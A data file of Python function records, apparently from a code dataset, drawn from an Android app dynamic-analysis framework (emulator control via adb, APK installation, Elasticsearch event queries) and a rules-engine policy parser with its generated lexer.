self._logger.debug(\" - (init.svc.bootanim)\")\n    ready = False\n    while not ready:\n        cmd = [\n            self.__adbPath, \"-s\", \"emulator-5554\", \"shell\", \"getprop\", \"init.svc.bootanim\"\n        ]\n        result = OSCommand.executeCommand(cmd)\n        if result is not None and result.strip() == \"stopped\":\n            ready = True\n        else:\n            time.sleep(1)\n\ntime.sleep(5)\nself._logger.info(\"Device seems to be ready!\")", "path": "tools\\emulatorCreator\\HookerInstaller.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Installs the specified APK on the device\"\"\"\n\n", "func_signal": "def installAPK(self, apkFilename):\n", "code": "if self.state != AndroidDevice.STATE_STARTED:\n    raise Exception(\"Cannot install the application since the device is not started.\")\n\nif apkFilename is None or len(apkFilename)==0:\n    raise Exception(\"Cannot install an application that has no name.\")\n\nself._logger.info(\"Installing APK {0} on device {1}\".format(apkFilename, self.name))\n\n# $ adb install file.apk\ncmd = [\n    self.mainConfiguration.adbPath,\n    \"-s\",\n    self.serialNumber,\n    \"install\",\n    apkFilename\n]\nOSCommand.executeCommand(cmd)", "path": "hooker_xp\\hooker_xp\\device\\AndroidDevice.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"\nStarts the specified activity from the specified package name on the device.\nThis method has to be called when package name is different from main activity.\n\"\"\"\n", "func_signal": "def startActivityFromPackage(self, packageName, activityName):\n", "code": "if self.state != AndroidDevice.STATE_STARTED:\n    raise Exception(\"Cannot start an activity since the device is not started.\")\n\nif activityName is None or len(activityName)==0:\n    raise Exception(\"Activity name is null.\")\n\nif packageName is None or len(packageName)==0:\n    raise Exception(\"Package name is null.\")\n\nself._logger.info(\"Starting activity {0}/{1} on device {2}\".format(packageName, activityName, self.name))\n\n# $ adb shell am start -n activityPackage/activity\ncmd = [\n    self.mainConfiguration.adbPath,\n    \"-s\",\n    self.serialNumber,\n    \"shell\",\n    \"am\",\n    \"start\",\n    \"-n\",\n    \"{0}/{1}\".format(packageName, activityName)\n]\np = OSCommand.executeAsyncCommand(cmd)\nstdout,stderr = p.communicate()\nself._logger.debug(\"{0}\".format(stdout))", "path": "hooker_xp\\hooker_xp\\device\\AndroidDevice.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Main function that execute the various post-analysis functions\"\"\"\n", "func_signal": "def main():\n", "code": "logger.info(\"Execution of the Post-Analysis functions\")\n\n# Initialization of the connection to an ES database\nes = Es([{\"host\":ES_IP, 'port':ES_PORT}])\n\nesInterrogator = EsInterrogator(es)\n\n# ======================================================    \n# Activate here the kind of analysis you want to perform\n# ======================================================\n\n# macroAnalyzeConnectTo(esInterrogator)    \n# macroAnalyzeCrypto(esInterrogator)\n# macroAnalyzeTelephony(esInterrogator)\n# macroAnalyzeNetwork(esInterrogator)\n# macroAnalyzeIPC(esInterrogator)\n# macroAnalyzeWebview(esInterrogator)\n# macroAnalyzeX509CustomVerification(esInterrogator)\n# macroAnalyzeDeviceLockBypass(esInterrogator)\n# macroAnalyzeGeolocation(esInterrogator)\n\n# # Retrieve all the known APKs (analyzed or not)\n# # =============================================\n# logger.warn(\"List of APKs\")\n# logger.warn(\"------------------------------------------------\")\n# apks = esInterrogator.getAllAPKs()\n# for apk in apks:\n#     logger.info(\"Name:{0} - Market:{1} - Downloaded Date:{2} - Filesha1:{3} - Filename:{4}\".format(apk.Name, apk.Market, apk.Timestamp, apk.Filesha1, apk.Filename))\n    \n# logger.warn(\"> We found {0} apks.\".format(len(apks)))\n# logger.warn(\"------------------------------------------------\")\n\n# # Retrieve all the known experimentations\n# # =======================================\n# logger.warn(\"List of Experimentations\")\n# logger.warn(\"------------------------------------------------\")\n# experiments = esInterrogator.getAllExperiments()\n# for experiment in experiments:\n#     logger.info(\"IDXP:{0} - Filename:{1} - Filesha1:{2} - Emulator:{3}\".format(experiment.IDXP, experiment.Filename, experiment.Filesha1, experiment.Emulator))\n    \n# logger.warn(\"> We found {0} experiments.\".format(len(experiments)))\n# logger.warn(\"------------------------------------------------\")\n\n# Now we list the experimentations that cover each APK\n# ====================================================\n# logger.warn(\"List of Experimentations per APK\")\n# logger.warn(\"------------------------------------------------\")\n# for apk in apks:\n#     logger.info(\"APK {0} (sha1 = {1})\".format(apk.Name, apk.Filesha1))\n#     experiments = esInterrogator.getExperimentsWithAPKSha1(apk.Filesha1)\n#     for experiment in experiments:\n#         events = esInterrogator.getAllEventsOfExperiment(experiment.IDXP)\n#         logger.warn(\"\\t- XP {0} : {1} events captured.\".format(experiment.IDXP, len(events)))\n# logger.warn(\"------------------------------------------------\")    \n\n\n# Retrieve all the events associated with one Experiment\n# ======================================================\n# idXp = \"93deb34a13c8a958d75dea4beaea7718\"\n# logger.warn(\"List of events related to XP {0}\".format(idXp))\n# logger.warn(\"------------------------------------------------\")    \n# events = esInterrogator.getAllEventsOfExperiment(idXp)\n   \n# for event in events:\n#     logger.info(\"{0} - {1} - {2} - {3}\".format(event.HookerName, event.ClassName,  event.MethodName, event.PackageName))\n#     if event.Parameters is not None:\n#         for parameter in event.Parameters:\n#             logger.debug(\"Parameter: \"+str(parameter))\n            \n# logger.error(\"> We found {0} events.\".format(len(events)))\n# logger.warn(\"------------------------------------------------\")    \n\n# logger.warn(\"Events by Hooker\")\n# logger.warn(\"------------------------------------------------\")    \n\n# logger.warn(\"DynamicCodeLoader Events\")\n# logger.warn(\"------------------------------------------------\")            \n# dynEvents = esInterrogator.getAllEvents(HookerName=\"Account\")\n# for event in dynEvents:\n#     logger.info(eventToString(event))\n\n# logger.warn(\"Telephony Events\")\n# logger.warn(\"------------------------------------------------\")            \n# telephonyEvents = esInterrogator.getAllEvents(HookerName=\"Telephony\")\n# for event in telephonyEvents:\n#     logger.info(eventToString(event))\n    \n# logger.warn(\"Runtime Events\")\n# logger.warn(\"------------------------------------------------\")            \n# runtimeEvents = esInterrogator.getAllEvents(HookerName=\"RunTime\")\n# for event in runtimeEvents:\n#     logger.info(eventToString(event))\n\n# logger.warn(\"System Events\")\n# logger.warn(\"------------------------------------------------\")            \n# systemEvents = esInterrogator.getAllEvents(HookerName=\"System\")\n# for event in systemEvents:\n#     logger.info(eventToString(event))\n\n# logger.warn(\"Network Events\")\n# logger.warn(\"------------------------------------------------\")            \n# networkEvents = esInterrogator.getAllEvents(HookerName=\"Network\")\n# for event in networkEvents:\n#     logger.info(eventToString(event))\n   \n# Lets retrieve only java.net.URL:URL method calss\n# logger.warn(\"List of URLs\")\n# logger.warn(\"------------------------------------------------\")            \n# listOfURLs = dict()\n# urlEvents = esInterrogator.getAllEvents(ClassName=\"java.net.URL\", MethodName=\"URL\")\n# for urlEvent in urlEvents:\n#     if urlEvent.Parameters is not None and len(urlEvent.Parameters) == 1:\n#         url = urlEvent.Parameters[0][\"ParameterValue\"]\n#         if url not in listOfURLs.keys():\n#             listOfURLs[url] = 0\n#         listOfURLs[url] += 1\n#     else:\n#         logger.warn(eventToString(urlEvent))\n# for url, nbDef in listOfURLs.iteritems():\n#     logger.info(\"{0} ({1})\".format(url, nbDef))\n\n\n\n    \n# Let's find all the apks\n#apks = es.getAllAPKs()", "path": "hooker_analysis\\hooker_analysis.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"toString method\"\"\"\n", "func_signal": "def __str__(self):\n", "code": "lines = [\n    \"---------------\",\n    \"Manual Analysis\",\n    \"---------------\",\n    str(self.mainConfiguration),\n    str(self.analysisConfiguration),\n    str(self.reportingConfiguration),\n    \"---------------\"\n]\nreturn '\\n'.join(lines)", "path": "hooker_xp\\hooker_xp\\ManualAnalysis.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"\nChecks that ADB recognizes the device. Returns True if device is recognized by ADB, False otherwise.\n\"\"\"\n", "func_signal": "def __checkADBRecognizeDevice(self):\n", "code": "self._logger.info(\"Checking if ADB recognizes device...\")\n    \ncmd = [\n    self.mainConfiguration.adbPath,\n    \"devices\"\n]\n\noutput = OSCommand.executeCommand(cmd)\n\nif self.serialNumber in output:\n    self._logger.debug(\"Device has been find!\")\n    return True\n\nself._logger.error(\"Device has not been found.\")\nreturn False", "path": "hooker_xp\\hooker_xp\\device\\AndroidDevice.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Starts a manual analysis\"\"\"\n\n", "func_signal": "def start(self):\n", "code": "if self.mainConfiguration is None:\n    raise Exception(\"No main configuration found, cannot start the analysis..\")\nif self.reportingConfiguration is None:\n    raise Exception(\"No reporting configuration found, cannot start the analysis.\")\nif self.analysisConfiguration is None:\n    raise Exception(\"No analysis configuration found, cannot start the analysis.\")\n\nself._logger.info(str(self))\n\n# Build the identifier experiment\nidXp = self._generateIdXp(self.analysisConfiguration.apkFiles)\n\n# Targeted APK\nanalyzedAPKFile = self.analysisConfiguration.apkFiles[0]\n\n# Execute the analysis on the first emulator\niEmulator = 0\nemulatorName = \"Emulator_{0}\".format(iEmulator)\n\n# Create a new report for this analysis\nAnalysis.createReport(self.reporter, idXp, emulatorName, \"unknown\", analyzedAPKFile, \"manual\", self.mainConfiguration.name)\n\n# Execute static analysis\nstaticAnalysis = StaticAnalysis(analyzedAPKFile, self.mainConfiguration, self.reporter, idXp)\n\nAnalysis.reportEvent(self.reporter, idXp, \"Analysis\", \"Executing static analysis on {0}\".format(analyzedAPKFile))        \nstaticAnalysis.execute()\nself._logger.info(staticAnalysis)\n\nif self.mainConfiguration.typeOfDevice=='emulated':\n    device = Analysis.createEmulator(iEmulator, emulatorName, self.mainConfiguration, analysisType=\"manual\")\nelse:\n    device = Analysis.createDevice(iEmulator, self.mainConfiguration.deviceId, self.mainConfiguration, self.analysisConfiguration.backupDirectory, analysisType=\"manual\")\n\nif device is None:\n    raise Exception(\"Something has prevented the creation of the device.\")\n\n# Starts the device\nAnalysis.reportEvent(self.reporter, idXp, emulatorName, \"Start device\")\ntry:\n    device.start()\nexcept: \n    self._logger.error(traceback.format_exc())\n    device.stop()\n    return\n\n# Install preparation applications\n# A real device do not need preparation applications\nif self.mainConfiguration.typeOfDevice=='emulated':\n    for prepareAPK in self.analysisConfiguration.prepareAPKs:\n        Analysis.reportEvent(self.reporter, idXp, emulatorName, \"Install preparation APK\", prepareAPK)\n        device.installAPK(prepareAPK)\n\n    # Execute preparation applications\n    for prepareAPK in self.analysisConfiguration.prepareAPKs:\n        Analysis.reportEvent(self.reporter, idXp, emulatorName, \"Start activity\", os.path.basename(prepareAPK)[:-4])\n        device.startActivity(os.path.basename(prepareAPK)[:-4])\nelse:\n    self._logger.debug(\"Continuing...\")\n\n# Writes the experiment configuration on the device\nAnalysis.reportEvent(self.reporter, idXp, emulatorName, \"Write configuration file\")\nself._writeConfigurationOnEmulator(device, idXp)\n\nif self.mainConfiguration.typeOfDevice=='emulated':\n    sleepDuration = 30\n    self._logger.debug(\"Waiting {0} seconds for the device to prepare...\".format(sleepDuration))\n    time.sleep(sleepDuration)\n\n# Install the targeted application\nfor analysisAPK in self.analysisConfiguration.apkFiles:\n    Analysis.reportEvent(self.reporter, idXp, emulatorName, \"Install target APK\", analysisAPK)\n    device.installAPK(analysisAPK)\n\nAnalysis.reportEvent(self.reporter, idXp, emulatorName, \"Launching main activity\", staticAnalysis.mainActivity)\nself._logger.info(\"Starting main activity: {0}\".format(staticAnalysis.mainActivity))\ndevice.startActivityFromPackage(staticAnalysis.packageName, staticAnalysis.mainActivity)\n\n# The user is now requested to perform any operations he wants\n# this script waits for the device process to be closed\nself._logger.info(\"Proceed to the stimulation of the environnment.\")\nself._logger.info(\"Once achieved, close the device and waits for the hooker to finish.\")\nAnalysis.reportEvent(self.reporter, idXp, emulatorName, \"Wait for emulator to be closed\")\n\ndevice.waitToBeClosed()\nif self.mainConfiguration.typeOfDevice=='real':\n    device.stop(True)\nAnalysis.reportEvent(self.reporter, idXp, emulatorName, \"Analysis has finished\")\nAnalysis.reportEvent(self.reporter, idXp, emulatorName, \"Emulator closed\")\nself._logger.info(\"Device has finished, IDXP is {0}\".format(idXp))", "path": "hooker_xp\\hooker_xp\\ManualAnalysis.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"\nRestarts ADB server. This function is not used because we have to verify we don't have multiple devices.\n\"\"\"\n", "func_signal": "def _restartADBServer(self):\n", "code": "self._logger.info(\"Restarting ADB server...\")\n    \ncmd = [\n    self.mainConfiguration.adbPath,\n    \"kill-server\"\n]\nOSCommand.executeCommand(cmd)\nself._logger.info(\"ADB server has been killed.\")\n\ncmd = [\n    self.mainConfiguration.adbPath,\n    \"start-server\"\n]\nOSCommand.executeCommand(cmd)\nself._logger.info(\"ADB server has been restarted.\")", "path": "hooker_xp\\hooker_xp\\device\\AndroidDevice.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\" Starts AVD \"\"\"\n", "func_signal": "def __startAvd(self):\n", "code": "cmd = [\n    self.__emulatorPath, \"-avd\", self.__avdName, \"-partition-size\", self.__partitionSize\n]\nreturn OSCommand.executeAsyncCommand(cmd)", "path": "tools\\emulatorCreator\\HookerInstaller.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Configures the class attributed through\nparameters stored in the command line parser.\nReturns the configuration\n\"\"\"\n\n", "func_signal": "def __prepareAnalysis(self, commandLineParser):\n", "code": "if commandLineParser is None:\n    raise Exception(\"Cannot build the analysis configuration if no commandLineParser is provided\")\n\nanalysisOptions = commandLineParser.manualOptions\n\nif not 'apks' in analysisOptions.keys():\n    raise Exception(\"The apks configuration entry is missing.\")\n\napkFiles = []\nfor apkFile in analysisOptions['apks'].split(\",\"):\n    if apkFile is not None and len(apkFile)>0:\n        # check the apk exists and is readable\n        if not os.path.isfile(apkFile):\n            raise Exception(\"The apkFile {0} is not a file, we cannot prepare the analysis.\".format(apkFile))\n        if not os.access(apkFile, os.R_OK):\n            raise Exception(\"The apkFile {0} cannot be read, check the permissions.\".format(apkFile))\n        apkFiles.append(apkFile)\n\nmaxNumberOfEmulators = 1\nif 'maxnumberofemulators' in analysisOptions.keys():\n    try:\n        maxNumberOfEmulators = int(analysisOptions['maxnumberofemulators'])\n    except:\n        raise Exception(\"'MaxNumberOfEmulators' in the configuration must be an interger.\")            \n\nprepareAPKs = []\nif 'prepareapks' in analysisOptions.keys():\n    for prepareAPK in analysisOptions['prepareapks'].split(\",\"):\n        if prepareAPK is not None and len(prepareAPK)>0:\n            # check the apk exists and is readable\n            if not os.path.isfile(prepareAPK):\n                raise Exception(\"The prepareAPK {0} is not a file, we cannot prepare the analysis.\".format(prepareAPK))\n            if not os.access(prepareAPK, os.R_OK):\n                raise Exception(\"The prepareAPK {0} cannot be read, check the permissions.\".format(prepareAPK))\n            prepareAPKs.append(prepareAPK)\n\nbackupDirectory = None\nif 'backupdirectory' in analysisOptions.keys():\n    backupDirectory = analysisOptions['backupdirectory']\n    if not os.path.isdir(backupDirectory):\n        raise Exception(\"{0} is not a valid directory, you must provide one in automatic mode.\".format(backupDirectory))\n    if not os.access(backupDirectory, os.R_OK):\n        raise Exception(\"You don't have read access to directory {0}.\".format(backupDirectory))\n            \nself._logger.debug(\"Configure the manual analysis.\")\nanalysis = ManualAnalysisConfiguration(apkFiles, maxNumberOfEmulators=maxNumberOfEmulators, prepareAPKs=prepareAPKs, backupDirectory=backupDirectory)\n\nreturn analysis", "path": "hooker_xp\\hooker_xp\\ManualAnalysis.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"toString method\"\"\"\n", "func_signal": "def __str__(self):\n", "code": "lines = [\n    \"Automatic Analysis Conf.:\",\n    \"\\t- APKs\\t\\t\\t{0}\".format(','.join(self.apkFiles)),\n    \"\\t- Nb Emulators\\t\\t{0}\".format(self.maxNumberOfEmulators),\n    \"\\t- Preparation APKs\\t{0}\".format(','.join(self.prepareAPKs)),\n    \"\\t- Scenario\\t\\t{0}\".format(','.join(self.scenario)),\n    \"\\t- Output directory\\t{0}\".format(self.outputDirectory),\n    \"\\t- Backup directory\\t{0}\".format(self.backupDirectory)\n    ]\nreturn '\\n'.join(lines)", "path": "hooker_xp\\hooker_xp\\analysis\\AutomaticAnalysisConfiguration.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "'''\nA recursive method used to rewrite a Constraint object so that learned objects may\nbe filtered.\n\nArgs:\n    original: Constraint to be rewritten.\n    rewritten: used in recursion, the object to be written into.\n    klazz: the object name by the ClassConstraint.name\n'''\n", "func_signal": "def rewrite(original, rewritten, klazz):\n", "code": "for child in original.children:\n    if isinstance(child, Node):\n        if isinstance(child, Power):\n            # inspect and rewrite, if necessary\n            if isinstance(child.first_child(), Atom) \\\n                and Node.is_name(child.first_child().first_child()) \\\n                and reflection.has_attribute(klazz, child.first_child().first_child()):\n                # The classConstraint.name used to signify the class the\n                # the constraint corresponds to has this (instance /\n                # class / static) method, property, or global.  So,\n                # rewrite the Constraint object by prepending \"fact\"\n                # before the first Atom object in this particular Power\n                # node.\n                #\n                # TODO: need a better string then \"fact\" as this may\n                # may already be used in the constraint\n                power = Power([Atom(\"fact\"), Trailer([\".\", child.first_child().first_child()])])\n                rewritten.append_child(power)\n\n                if (len(child.children) > 1):\n                    for c in child.children[1:]:\n                        twin = type(c)()\n                        power.append_child(When.rewrite(c, twin, klazz))\n            else:\n                # nothing matched to rewrite; so, clone\n                twin = type(child)()\n                rewritten.append_child(When.rewrite(child, twin, klazz))\n\n        else:\n            # handle a child Node that is not of Power node\n            twin = type(child)()\n\n            rewritten.append_child(When.rewrite(child, twin, klazz))\n\n    else:\n        # handle a child that is a string\n        rewritten.append_child(child)\n\nreturn rewritten", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nThe File Node that defines this node\n'''\n", "func_signal": "def file(self, value):\n", "code": "if isinstance(value, File):\n    self._file = value\nelse:\n    raise TypeError(\"'file' must be of type File.\")", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns either an empty list or a list containing\none or more RuleStmt objects\n'''\n", "func_signal": "def ruleStmts(self):\n", "code": "ruleStmts = []\n\nfor file in self.files:\n    ruleStmts.extend(file.ruleStmts)\n\nreturn ruleStmts", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns a str representation of Then as it would be written in a policy.\n'''\n", "func_signal": "def __str__(self):\n", "code": "value = \"then:\\n\"\n\nfor action in self.actions:\n    for line in str(action).splitlines():\n        value += \"\\t\" + line + \"\\n\"\n\nreturn value", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "\"\"\"\nWrites a prepend for the statement to allow it to be processed by a Python exec statement\n\"\"\"\n", "func_signal": "def write_prepend(self):\n", "code": "returnStmt = \"global \"\n\nfor object_reference in [atom.first_child() for atom in Node.filter_to_list(Atom, self.expressionStmt.children[0]) if len(atom.children) is 1]:\n    returnStmt += object_reference + \", \"\n\nreturn (\"; \").join(returnStmt.rsplit(\", \", 1))", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns True, if the string parameter is a grammar defined NAME token\n\nArgs:\n    string: str to validate\n'''\n", "func_signal": "def is_name(string):\n", "code": "if not isinstance(string, basestring):\n    # Name tokens must be a str object.\n    return False\nelse:\n    if not string:\n        #Name tokens cannot be empty str object.\n        return False\n\n    if not string[0].isalpha() and string[0] != \"_\":\n        #Name tokens must begin with an alpha character\n        return False\n\n    for char in string[1:]:\n        if not char.isalpha() and char != \"_\" and not char.isdigit():\n            return False\n\nreturn True", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns the local name used in the policy to refer to the class,\nor None meaning there is no local name.\n'''\n", "func_signal": "def localName(self):\n", "code": "if len(self.children) == 3:\n    return self.children[2]\nelse:\n    return None", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "# convince pylint that my self_ magic is ok ;)\n# pylint: disable-msg=E0213\n\n# pretend we are a member of the recognizer\n# thus semantic predicates can be evaluated\n", "func_signal": "def specialStateTransition(self_, s, input):\n", "code": "self = self_.recognizer\n\n_s = s\n\nif s == 0: \n    LA47_48 = input.LA(1)\n\n     \n    index47_48 = input.index()\n    input.rewind()\n    s = -1\n    if (LA47_48 == 35) and ((self.startPosition == 0 )):\n        s = 114\n\n    elif (LA47_48 == 32) and (((self.startPosition > 0 ) or (self.startPosition == 0 ))):\n        s = 48\n\n    elif (LA47_48 == 10 or LA47_48 == 13) and ((self.startPosition == 0 )):\n        s = 116\n\n    elif (LA47_48 == 9) and (((self.startPosition > 0 ) or (self.startPosition == 0 ))):\n        s = 49\n\n    else:\n        s = 115\n\n     \n    input.seek(index47_48)\n    if s >= 0:\n        return s\nelif s == 1: \n    LA47_49 = input.LA(1)\n\n     \n    index47_49 = input.index()\n    input.rewind()\n    s = -1\n    if (LA47_49 == 35) and ((self.startPosition == 0 )):\n        s = 114\n\n    elif (LA47_49 == 32) and (((self.startPosition > 0 ) or (self.startPosition == 0 ))):\n        s = 48\n\n    elif (LA47_49 == 10 or LA47_49 == 13) and ((self.startPosition == 0 )):\n        s = 116\n\n    elif (LA47_49 == 9) and (((self.startPosition > 0 ) or (self.startPosition == 0 ))):\n        s = 49\n\n    else:\n        s = 117\n\n     \n    input.seek(index47_49)\n    if s >= 0:\n        return s\nelif s == 2: \n    LA47_0 = input.LA(1)\n\n     \n    index47_0 = input.index()\n    input.rewind()\n    s = -1\n    if (LA47_0 == 40):\n        s = 1\n\n    elif (LA47_0 == 41):\n        s = 2\n\n    elif (LA47_0 == 91):\n        s = 3\n\n    elif (LA47_0 == 93):\n        s = 4\n\n    elif (LA47_0 == 123):\n        s = 5\n\n    elif (LA47_0 == 125):\n        s = 6\n\n    elif (LA47_0 == 58):\n        s = 7\n\n    elif (LA47_0 == 44):\n        s = 8\n\n    elif (LA47_0 == 46):\n        s = 9\n\n    elif (LA47_0 == 59):\n        s = 10\n\n    elif (LA47_0 == 43):\n        s = 11\n\n    elif (LA47_0 == 45):\n        s = 12\n\n    elif (LA47_0 == 42):\n        s = 13\n\n    elif (LA47_0 == 36):\n        s = 14\n\n    elif (LA47_0 == 47):\n        s = 15\n\n    elif (LA47_0 == 124):\n        s = 16\n\n    elif (LA47_0 == 38):\n        s = 17\n\n    elif (LA47_0 == 60):\n        s = 18\n\n    elif (LA47_0 == 62):\n        s = 19\n\n    elif (LA47_0 == 61):\n        s = 20\n\n    elif (LA47_0 == 37):\n        s = 21\n\n    elif (LA47_0 == 96):\n        s = 22\n\n    elif (LA47_0 == 94):\n        s = 23\n\n    elif (LA47_0 == 126):\n        s = 24\n\n    elif (LA47_0 == 33):\n        s = 25\n\n    elif (LA47_0 == 103):\n        s = 26\n\n    elif (LA47_0 == 97):\n        s = 27\n\n    elif (LA47_0 == 114):\n        s = 28\n\n    elif (LA47_0 == 119):\n        s = 29\n\n    elif (LA47_0 == 101):\n        s = 30\n\n    elif (LA47_0 == 116):\n        s = 31\n\n    elif (LA47_0 == 109):\n        s = 32\n\n    elif (LA47_0 == 105):\n        s = 33\n\n    elif (LA47_0 == 108):\n        s = 34\n\n    elif (LA47_0 == 100):\n        s = 35\n\n    elif (LA47_0 == 102):\n        s = 36\n\n    elif (LA47_0 == 104):\n        s = 37\n\n    elif (LA47_0 == 112):\n        s = 38\n\n    elif (LA47_0 == 111):\n        s = 39\n\n    elif (LA47_0 == 110):\n        s = 40\n\n    elif (LA47_0 == 48):\n        s = 41\n\n    elif ((49 <= LA47_0 <= 57)):\n        s = 42\n\n    elif (LA47_0 == 117):\n        s = 43\n\n    elif ((65 <= LA47_0 <= 90) or LA47_0 == 95 or (98 <= LA47_0 <= 99) or (106 <= LA47_0 <= 107) or LA47_0 == 113 or LA47_0 == 115 or LA47_0 == 118 or (120 <= LA47_0 <= 122)):\n        s = 44\n\n    elif (LA47_0 == 34 or LA47_0 == 39):\n        s = 45\n\n    elif (LA47_0 == 92):\n        s = 46\n\n    elif (LA47_0 == 10 or (12 <= LA47_0 <= 13)):\n        s = 47\n\n    elif (LA47_0 == 32) and (((self.startPosition > 0 ) or (self.startPosition == 0 ))):\n        s = 48\n\n    elif (LA47_0 == 9) and (((self.startPosition > 0 ) or (self.startPosition == 0 ))):\n        s = 49\n\n    elif (LA47_0 == 35) and (((self.startPosition > 0 ) or (self.startPosition == 0 ))):\n        s = 50\n\n     \n    input.seek(index47_0)\n    if s >= 0:\n        return s\nelif s == 3: \n    LA47_115 = input.LA(1)\n\n     \n    index47_115 = input.index()\n    input.rewind()\n    s = -1\n    if ((self.startPosition > 0 )):\n        s = 157\n\n    elif (((self.startPosition == 0 ) or (((self.startPosition == 0 )) and ((self.implicitLineJoiningLevel > 0))))):\n        s = 116\n\n     \n    input.seek(index47_115)\n    if s >= 0:\n        return s\nelif s == 4: \n    LA47_117 = input.LA(1)\n\n     \n    index47_117 = input.index()\n    input.rewind()\n    s = -1\n    if ((self.startPosition > 0 )):\n        s = 157\n\n    elif (((self.startPosition == 0 ) or (((self.startPosition == 0 )) and ((self.implicitLineJoiningLevel > 0))))):\n        s = 116\n\n     \n    input.seek(index47_117)\n    if s >= 0:\n        return s\n\nnvae = NoViableAltException(self_.getDescription(), 47, _s, input)\nself_.error(nvae)\nraise nvae", "path": "intellect\\grammar\\PolicyLexer.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns the node's first child, if it has one; otherwise, None.\n'''\n", "func_signal": "def first_child(self):\n", "code": "if (not self.children):\n    return None\nelse:\n    return self.children[0]", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturn an objectBinding str, if one exists otherwise None\n'''\n", "func_signal": "def objectBinding(self):\n", "code": "if isinstance(self.first_child(), basestring) and self.first_child().startswith(\"$\"):\n    return self.first_child()\nelse:\n    return None", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nSets this node's file property and all its descendants'\nfile property to file_node.\n'''\n\n", "func_signal": "def set_file_on_descendants(node=None, file_node=None):\n", "code": "if not isinstance(node, (Node, types.NoneType)):\n    raise TypeError(\"'node' must be of type Node.\")\n\nnode.file = file_node\n\nfor child in node.children:\n    if isinstance(child, Node):\n        child.file = file_node\n        File.set_file_on_descendants(child, file_node)", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns a str representation of When as it would be written in a policy.\n'''\n", "func_signal": "def __str__(self):\n", "code": "value = \"when:\\n\"\nvalue += \"\\t{0}\".format(self.ruleCondition)\n\nreturn value", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns a str for this the node and its children for what they represent\nin the policy.\n'''\n", "func_signal": "def __str__(self):\n", "code": "value = \"\"\n\nfor child in self.children:\n    value += str(child)\n\nreturn value", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "\"\"\"\nPFM to get self of method decorated\n\"\"\"\n\n", "func_signal": "def __get__(self, obj, obj_type):\n", "code": "if obj is None:\n    return self\n\nnew_method = self.__method.__get__(obj, obj_type)\n\nreturn self.__class__(new_method)", "path": "intellect\\Callable.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns a str representation of the policy.\n'''\n", "func_signal": "def __str__(self):\n", "code": "value = \"\"\n\nfor child in self.children:\n    value += str(child) + \"\\n\"\n\nreturn value", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns a RuleCondition object.\n'''\n", "func_signal": "def ruleCondition(self):\n", "code": "filter = [child for child in self.children if isinstance(child, RuleCondition)]\n\nif not filter:  # True, if filter is []\n    return None\nelse:\n    return filter[0]", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns a str representation of ListMaker as it would be written in a\npolicy.\n'''\n", "func_signal": "def __str__(self):\n", "code": "value = \"\"\n\nfor child in self.children:\n\n    value += str(child)\n\n    if (child == \",\"):\n        value += \" \"\n\nvalue = value.rstrip()\n\nreturn value", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
